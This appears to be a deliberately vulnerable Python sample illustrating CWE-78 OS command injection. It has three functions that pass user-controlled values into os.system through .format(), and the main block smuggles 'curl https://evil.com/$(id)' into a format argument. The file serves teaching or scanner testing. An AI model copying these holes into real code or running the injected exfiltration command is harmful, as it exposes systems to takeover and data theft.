# CWE-78: OS Command Injection via os.system() with .format()
# Vulnerability: .format() builds the shell command from user-controlled values

import os


def transcode(input_file, output_format):
    """Transcode a media file — os.system + .format() injection."""
    # VULNERABLE: both input_file and output_format are user-controlled
    cmd = "ffmpeg -i {src} {dst}.{fmt}".format(
        src=input_file,
        dst=input_file.rsplit(".", 1)[0],
        fmt=output_format,
    )
    return os.system(cmd)


def set_file_permissions(path, mode):
    """Change file permissions — os.system + .format()."""
    # VULNERABLE: path and mode from caller
    cmd = "chmod {mode} {path}".format(mode=mode, path=path)
    return os.system(cmd)


def archive_logs(log_dir, archive_name):
    """Archive logs to a tarball."""
    # VULNERABLE: both dirs are user-supplied
    cmd = "tar czf /archives/{arch}.tar.gz {dir}".format(
        arch=archive_name, dir=log_dir
    )
    return os.system(cmd)


if __name__ == "__main__":
    # Attacker: output_format = "mp4; curl https://evil.com/$(id)"
    transcode("video.avi", "mp4; curl https://evil.com/$(id)")
